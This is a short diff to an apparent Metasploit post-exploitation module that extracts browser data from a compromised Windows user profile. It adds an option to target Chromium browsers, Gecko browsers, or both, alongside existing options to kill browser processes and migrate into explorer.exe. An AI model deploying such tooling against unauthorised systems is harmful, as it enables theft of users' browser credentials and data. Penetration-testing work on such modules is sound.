@@ -34,7 +34,8 @@ class MetasploitModule < Msf::Post
 
     register_options([
       OptBool.new('KILL_BROWSER', [false, 'Kill browser processes before extracting data', false]),
-      OptBool.new('USER_MIGRATION', [false, 'Migrate to explorer.exe running under user context before extraction', false])
+      OptBool.new('USER_MIGRATION', [false, 'Migrate to explorer.exe running under user context before extraction', false]),
+      OptEnum.new('BROWSER_TYPE', [true, 'Specify which browser type to extract data from', 'all', ['all', 'chromium', 'gecko']])
     ])
   end
 
@@ -67,8 +68,15 @@ class MetasploitModule < Msf::Post
     print_status("Targeting: #{user_account} (#{ip_address}).")
     print_status("Starting data extraction from user profile: #{user_profile}")
 
-    process_chromium_browsers(user_profile)
-    process_gecko_browsers(user_profile)
+    case datastore['BROWSER_TYPE']
+    when 'chromium'
+      process_chromium_browsers(user_profile)
+    when 'gecko'
+      process_gecko_browsers(user_profile)
+    else
+      process_chromium_browsers(user_profile)
+      process_gecko_browsers(user_profile)
+    end
   end
 
   def migrate_to_explorer
